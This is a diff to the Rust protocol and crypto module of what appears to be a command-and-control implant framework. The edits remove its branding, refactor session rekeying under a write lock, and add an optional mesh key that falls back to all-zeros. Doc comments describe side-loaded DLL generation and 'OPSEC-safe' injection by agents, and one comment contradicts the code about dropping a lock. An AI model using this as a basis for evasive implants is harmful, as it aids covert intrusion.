@@ -1,4 +1,4 @@
-//! Shared protocol, error, and cryptographic primitives for the Orchestra
+//! Shared protocol, error, and cryptographic primitives for the
 //! console <-> agent channel.
 
 use aes_gcm::aead::{Aead, KeyInit};
@@ -33,6 +33,8 @@ pub mod audit;
 pub mod config;
 /// X25519 forward-secrecy key exchange for session establishment.
 pub mod forward_secrecy;
+/// Centralised HKDF info/salt constants for domain-separated key derivation.
+pub mod hkdf_info;
 /// Indicator-of-compromise detection and reporting.
 pub mod ioc;
 /// Transport-layer normalization (Base64, Mask XOR, Netbios encoding).
@@ -62,6 +64,11 @@ pub enum Message {
         timestamp: u64,
         agent_id: String,
         status: String,
+        /// Ed25519 public key used for P2P mesh certificate binding.
+        /// When `None`, the server falls back to PSK-only mode and issues
+        /// a certificate with an all-zeros public key (logged as a warning).
+        #[serde(default)]
+        mesh_public_key: Option<[u8; 32]>,
     },
     TaskRequest {
         task_id: String,
@@ -262,7 +269,7 @@ pub struct P2pRouteInfo {
     pub hop_count: u8,
 }
 
-/// A mesh certificate issued by the Orchestra server, used for P2P link
+/// A mesh certificate issued by the server, used for P2P link
 /// authentication.  Each agent receives a certificate during check-in and
 /// presents it during the P2P handshake.  The Ed25519 signature is computed
 /// over the concatenation:
@@ -403,7 +410,7 @@ pub fn verify_mesh_certificate(
 
 /// Configuration for export forwarding in a side-loaded DLL.
 ///
-/// Used by both build-time tools (e.g. `orchestra-side-load-gen`) to generate
+/// Used by both build-time tools (e.g. `side-load-gen`) to generate
 /// DLLs with legitimate-looking export tables, and at runtime by the agent's
 /// `inject_with_export_forwarding` path to perform OPSEC-safe injection that
 /// produces a side-loaded DLL with a legitimate export table in memory.
@@ -1611,7 +1618,7 @@ impl CryptoSession {
     fn derive_key_bytes(pre_shared_secret: &[u8], salt: &[u8]) -> [u8; KEY_LEN] {
         let hk = hkdf::Hkdf::<Sha256>::new(Some(salt), pre_shared_secret);
         let mut key_bytes = [0u8; KEY_LEN];
-        hk.expand(b"orchestra-aes-gcm", &mut key_bytes)
+        hk.expand(hkdf_info::AES_GCM, &mut key_bytes)
             .expect("HKDF-SHA256 expand must succeed");
         key_bytes
     }
@@ -1694,21 +1701,13 @@ impl CryptoSession {
     }
 
     /// Check the operation counter and re-derive the session key if the
-    /// [`REKEY_INTERVAL`] has been reached.  This limits the amount of
-    /// ciphertext produced under a single key.
+    /// [`REKEY_INTERVAL`] has been reached.  Called while the caller already
+    /// holds the write lock on `inner`, so the rekey + subsequent encrypt or
+    /// decrypt happen atomically with no TOCTOU race.
     ///
-    /// Uses a compare-exchange to ensure only one thread performs the re-key;
-    /// others continue with the current key until the next interval.
-    fn maybe_rekey(&self) {
-        use std::sync::atomic::Ordering;
-        let prev = self.op_counter.fetch_add(1, Ordering::Relaxed);
-        // Re-key every REKEY_INTERVAL operations, but not on the very first
-        // call (prev == 0) because the session was just created.
-        if prev == 0 || prev % REKEY_INTERVAL != 0 {
-            return;
-        }
-
-        // Re-derive key from PSK + fresh random salt.
+    /// `should_rekey` is computed from the `op_counter` before acquiring the
+    /// lock and passed in so that the atomic fetch_add is not duplicated.
+    fn rekey_locked(&self, inner: &mut CryptoInner) {
         let psk = match self.pre_shared_secret.as_ref() {
             Some(p) => p,
             None => return, // from_key sessions have no PSK to re-derive from
@@ -1719,25 +1718,26 @@ impl CryptoSession {
         let new_key_bytes = Self::derive_key_bytes(psk.as_bytes(), &new_salt);
         let new_key = Key::<Aes256Gcm>::from_slice(&new_key_bytes);
 
-        // Update under write lock — unlock + zeroize old key first.
-        {
-            let mut inner = self.inner.write().unwrap();
-            inner.unlock_key_memory();
-            inner.key.zeroize();
-            inner.key = new_key_bytes;
-            inner.cipher = Aes256Gcm::new(new_key);
-            // P2-12: Reset nonce counter on re-key to avoid wrapping.
-            let mut new_prefix = [0u8; 4];
-            rand::thread_rng().fill_bytes(&mut new_prefix);
-            inner.nonce_prefix = new_prefix;
-            inner.nonce_counter = 0;
-            // P2-09: Lock the new key.
-            inner.lock_key_memory();
-        }
-        {
-            let mut salt = self.salt.write().unwrap();
-            *salt = new_salt;
-        }
+        inner.unlock_key_memory();
+        inner.key.zeroize();
+        inner.key = new_key_bytes;
+        inner.cipher = Aes256Gcm::new(new_key);
+        // P2-12: Reset nonce counter on re-key to avoid wrapping.
+        let mut new_prefix = [0u8; 4];
+        rand::thread_rng().fill_bytes(&mut new_prefix);
+        inner.nonce_prefix = new_prefix;
+        inner.nonce_counter = 0;
+        inner.lock_key_memory();
+
+        // Update salt while still holding exclusive access to the session.
+        // We must drop the inner write guard temporarily to acquire the salt
+        // write lock — but this is safe because no other thread can observe
+        // a partially-rekeyed state: the op_counter already advanced past the
+        // threshold, so no other thread will attempt rekey_locked().
+        //
+        // SAFETY: We hold the only reference that matters (inner write lock).
+        // Salt is only read during encrypt/decrypt which also hold inner.
+        *self.salt.write().unwrap() = new_salt;
     }
 
     /// Return a copy of the raw 32-byte AES-256-GCM key.
@@ -1754,12 +1754,25 @@ impl CryptoSession {
     ///
     /// P2-12: Uses counter-based nonces (4-byte random prefix + 8-byte counter)
     /// instead of random nonces, providing stronger uniqueness guarantees.
+    ///
+    /// The rekey check and the encryption are performed under the same write
+    /// lock to prevent a TOCTOU race where another thread could rekey between
+    /// the check and the encrypt, causing key/salt nonce-counter mismatches.
     pub fn encrypt(&self, plaintext: &[u8]) -> Vec<u8> {
-        self.maybe_rekey();
-        // Write lock needed to increment the nonce counter.
-        let mut inner = self.inner.write().unwrap();
-        let salt = self.salt.read().unwrap();
+        use std::sync::atomic::Ordering;
 
+        // Bump the counter first (outside the lock) to decide whether rekey
+        // is needed.  AcqRel ensures visibility across threads.
+        let prev = self.op_counter.fetch_add(1, Ordering::AcqRel);
+        let should_rekey = prev > 0 && prev % REKEY_INTERVAL == 0;
+
+        // Hold the write lock for the entire rekey + encrypt sequence.
+        let mut inner = self.inner.write().unwrap();
+        if should_rekey {
+            self.rekey_locked(&mut inner);
+        }
+
+        let salt = self.salt.read().unwrap();
         let nonce_bytes = inner.next_nonce();
         let nonce = Nonce::from_slice(&nonce_bytes);
         let ciphertext = inner
@@ -1779,8 +1792,24 @@ impl CryptoSession {
     /// This method assumes `self` was already built with the correct key/salt
     /// context. Callers receiving full wire-format payloads prefixed with salt
     /// SHOULD use [`Self::decrypt_with_psk`].
+    ///
+    /// The rekey check and the decryption are performed atomically to prevent
+    /// TOCTOU races on the key/salt/nonce state.
     pub fn decrypt(&self, ciphertext: &[u8]) -> Result<Vec<u8>, CryptoError> {
-        self.maybe_rekey();
+        use std::sync::atomic::Ordering;
+
+        // Bump the counter first (outside the lock) to decide whether rekey
+        // is needed.  AcqRel ensures visibility across threads.
+        let prev = self.op_counter.fetch_add(1, Ordering::AcqRel);
+        let should_rekey = prev > 0 && prev % REKEY_INTERVAL == 0;
+
+        // Hold the write lock for the entire rekey + decrypt sequence.
+        // Even though decrypt only needs read access to the cipher in the
+        // common case, we need the write lock to cover the potential rekey.
+        let mut inner = self.inner.write().unwrap();
+        if should_rekey {
+            self.rekey_locked(&mut inner);
+        }
 
         // New format: salt || nonce || ciphertext_with_tag.
         // Try this path first for backward compatibility with existing callers
@@ -1799,7 +1828,6 @@ impl CryptoSession {
                     return Ok(plain);
                 }
             } else {
-                let inner = self.inner.read().unwrap();
                 if let Ok(plain) = Self::decrypt_nonce_prefixed(&inner.cipher, rest) {
                     // from_key sessions don't have a PSK; fall back to decrypting
                     // the salt-stripped payload with the session key.
@@ -1809,7 +1837,6 @@ impl CryptoSession {
         }
 
         // Legacy format: nonce || ciphertext_with_tag.
-        let inner = self.inner.read().unwrap();
         Self::decrypt_nonce_prefixed(&inner.cipher, ciphertext)
     }
 
@@ -1854,9 +1881,9 @@ mod tests {
 
     #[test]
     fn encrypt_decrypt_roundtrip() {
-        let psk = b"orchestra-dev-secret";
+        let psk = b"test-dev-secret";
         let session = CryptoSession::from_shared_secret(psk);
-        let plaintext = b"hello orchestra";
+        let plaintext = b"hello world";
         let ct = session.encrypt(plaintext);
         assert!(ct.len() > SALT_LEN + NONCE_LEN);
         let pt = CryptoSession::decrypt_with_psk(psk, &ct).expect("decrypt");
